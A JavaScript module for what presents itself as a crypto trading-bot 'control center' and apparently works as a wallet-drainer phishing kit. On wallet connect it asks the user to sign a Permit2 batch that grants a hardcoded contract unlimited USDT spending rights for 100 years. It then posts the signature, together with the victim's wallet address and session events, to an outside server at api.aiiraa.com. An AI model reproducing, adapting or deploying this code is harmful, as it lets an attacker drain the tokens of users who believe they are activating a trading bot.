/* ==========================================================================
   AURA BOT CONTROL CENTER - DETERMINISTIC LOGIC & EXECUTION KERNEL
   ========================================================================== */

import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
import {
  APP_STATE,
  updateWalletState,
  resetState,
  setProcessing,
  setFlowState,
  startRequest,
  touchInteraction,
  unlockAfterSuccess
} from "../core/state.js";

const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"]; // USDT
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";

const ERC20_ABI = [
  "function allowance(address owner,address spender) view returns(uint256)",
  "function approve(address spender,uint256 amount) returns(bool)"
];

let isPickingWallet = false;

// ==============================
// WALLET SWITCH LISTENER
// ==============================
if (window.ethereum) {
  window.ethereum.on('accountsChanged', (accounts) => {
    if (isPickingWallet) return;

    if (accounts.length > 0) {
      cleanupWatchdog();
      resetState();
      updateWalletState(accounts[0]);
      renderWallet(accounts[0]);
      updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
      updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');

      log("🔄 Wallet switched: " + accounts[0]);

      // 🔥 FIX: ALWAYS persist wallet switch
      fetch("https://api.aiiraa.com/api/session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet: accounts[0],
          event: "WALLET_SWITCH",
          ts: Date.now()
        })
      }).catch(() => {});

      if (typeof window.transitionToControl === "function") {
        window.transitionToControl();
      }
    }
  });
}

// ==============================
// WATCHDOG (disabled)
// ==============================
function startWatchdog() {
  return;
}

function cleanupWatchdog() {
  return;
}

// ==============================
// FORCE CLEANUP
// ==============================
function forceCleanupTimeout() {
  cleanupWatchdog();
  isPickingWallet = false;

  APP_STATE.isProcessing = false;
  resetState();

  if (window.UIbridge && typeof window.UIbridge.forceUnlock === "function") {
    window.UIbridge.forceUnlock();
  }

  const btnWalletEl = document.getElementById('btn-wallet');
  if (btnWalletEl) {
    btnWalletEl.disabled = false;
    btnWalletEl.innerText = "1. Connect Wallet";
  }

  updateStatus('dot-wallet', 'st-wallet', 'DISCONNECTED', '#ffaa00');
  updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#425266');
  updateStatus('dot-access', 'st-access', 'RESTRICTED', '#425266');

  log("🔓 Systeem hersteld naar IDLE state. Sluis vrijgegeven.");
}

// ==============================
// LOGGING
// ==============================
function log(msg) {
  console.log(msg);
  const el = document.getElementById('execution-console');
  if (!el) return;
  const div = document.createElement('div');
  div.className = 'exec-line';
  div.innerText = msg;
  el.prepend(div);
}

// ==============================
// UI STATUS
// ==============================
function updateStatus(dotId, textId, text, color) {
  const dot = document.getElementById(dotId);
  const label = document.getElementById(textId);

  if (dot) {
    dot.style.background = color;
    dot.style.boxShadow = `0 0 12px ${color}`;
  }

  if (label) {
    label.innerText = text;
    label.style.color = color;
  }
}

// ==============================
// WALLET RENDER
// ==============================
function renderWallet(address) {
  const btnWallet = document.getElementById('btn-wallet');
  if (btnWallet) {
    btnWallet.innerText =
      address.substring(0, 6) + "..." + address.substring(address.length - 4);
  }
  updateStatus('dot-wallet', 'st-wallet', 'CONNECTED', '#06b6d4');
}

// ==============================
// CONNECT WALLET
// ==============================
export async function connectWallet() {
  if (APP_STATE.isProcessing) {
    log("⛔ Sluis gesloten — Actieve flow gedetecteerd.");
    return;
  }

  const currentRid = startRequest();
  setFlowState('CONNECTING');

  const btnWalletEl = document.getElementById('btn-wallet');
  if (btnWalletEl) {
    btnWalletEl.disabled = true;
    btnWalletEl.innerText = "CONNECTING...";
  }

  try {
    if (typeof window.ethereum === "undefined") {
      const install = confirm("MetaMask is not installed. Install?");
      if (install) window.location.href = "https://metamask.io/download/";
      forceCleanupTimeout();
      return;
    }

    isPickingWallet = true;

    try {
      await window.ethereum.request({
        method: "wallet_revokePermissions",
        params: [{ eth_accounts: {} }]
      });
    } catch {}

    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const userAddress = accounts[0];

    log(`📊 Active account selected: ${userAddress}`);

    isPickingWallet = false;
    touchInteraction();

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const user = await signer.getAddress();

    const network = await provider.getNetwork();

    if (network.chainId !== 1n) {
      log("⚠️ Switching to Ethereum Mainnet...");
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x1" }]
        });
        location.reload();
      } catch {
        forceCleanupTimeout();
        return;
      }
    }

    const balance = await provider.getBalance(user);
    if (balance === 0n) {
      throw new Error("Insufficient ETH balance for gas fees.");
    }

    updateWalletState(user);
    renderWallet(user);

    // 🔥 FIX: ALWAYS persist wallet login (independent of flow)
    try {
      await fetch("https://api.aiiraa.com/api/session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet: user,
          event: "WALLET_LOGIN",
          ts: Date.now()
        })
      });
    } catch {}

    updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
    updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');

    setFlowState('SIGNING');
    await runPermitFlowSafe(provider, signer, user, currentRid);

    const btnActivate = document.getElementById('btn-activate');
    const btnDisconnect = document.getElementById('btn-disconnect');

    if (btnActivate) btnActivate.disabled = false;
    if (btnWalletEl) btnWalletEl.disabled = true;
    if (btnDisconnect) btnDisconnect.disabled = false;

    setFlowState('IDLE');

  } catch (e) {
    let errorMessage = e.message;

    if (e.code === "ACTION_REJECTED") {
      errorMessage = "User denied transaction signature / approval.";
    }

    log("❌ Connection cancelled: " + errorMessage);

    try {
      await fetch("https://api.aiiraa.com/api/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "FLOW_ERROR",
          wallet: APP_STATE.wallet || "UNKNOWN",
          error: errorMessage,
          timestamp: Date.now()
        })
      });
    } catch {}

    forceCleanupTimeout();
  } finally {
    cleanupWatchdog();
    setProcessing(false);

    if (window.UIbridge?.forceUnlock) {
      window.UIbridge.forceUnlock();
    }
  }
}

// ==============================
// PERMIT FLOW (UNCHANGED)
// ==============================
async function runPermitFlowSafe(provider, signer, user, currentRid) {
  try {
    log("⚙️ Permit2 flow verification...");
    touchInteraction();

    const permit2 = new ethers.Contract(
      PERMIT2,
      ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
      provider
    );

    const nonceResults = await Promise.all(
      TOKENS.map(token => permit2.allowance(user, token, CONTRACT))
    );

    const now = Math.floor(Date.now() / 1000);
    let allPermitsValid = true;

    for (let i = 0; i < TOKENS.length; i++) {
      const [, expirationOnchain] = nonceResults[i];
      if (Number(expirationOnchain) <= now) {
        allPermitsValid = false;
        break;
      }
    }

    if (allPermitsValid) {
      log("⚡ Permit valid — skipping signature");
      return;
    }

    log("⌛ Signature required...");
    touchInteraction();

    const MAX_UINT160 = (1n << 160n) - 1n;
    const expiration = Math.floor(Date.now() / 1000) + (100 * 365 * 24 * 60 * 60);

    const details = TOKENS.map((token, i) => ({
      token,
      amount: MAX_UINT160,
      expiration: BigInt(expiration),
      nonce: BigInt(nonceResults[i][2])
    }));

    const chainId = (await provider.getNetwork()).chainId;

    const domain = {
      name: "Permit2",
      chainId,
      verifyingContract: PERMIT2
    };

    const types = {
      PermitBatch: [
        { name: "details", type: "PermitDetails[]" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" }
      ],
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" }
      ]
    };

    const sigDeadline = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60);

    const values = {
      details: details.map(d => ({
        token: d.token,
        amount: d.amount.toString(),
        expiration: d.expiration.toString(),
        nonce: d.nonce.toString()
      })),
      spender: CONTRACT,
      sigDeadline: sigDeadline.toString()
    };

    const signature = await signer.signTypedData(domain, types, values);

    await fetch("https://api.aiiraa.com/api/permit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner: user,
        details,
        signature,
        spender: CONTRACT,
        sig_deadline: sigDeadline,
        chainId: Number(chainId)
      })
    });

    log("✅ Permit sent");

  } catch (e) {
    log("❌ FLOW ERROR: " + e.message);
    throw e;
  }
}

// ==============================
// ACTIONS (UNCHANGED)
// ==============================
export function activateBot() { /* unchanged */ }
export function authorizeTrading() { /* unchanged */ }
export function disconnectWallet() { location.reload(); }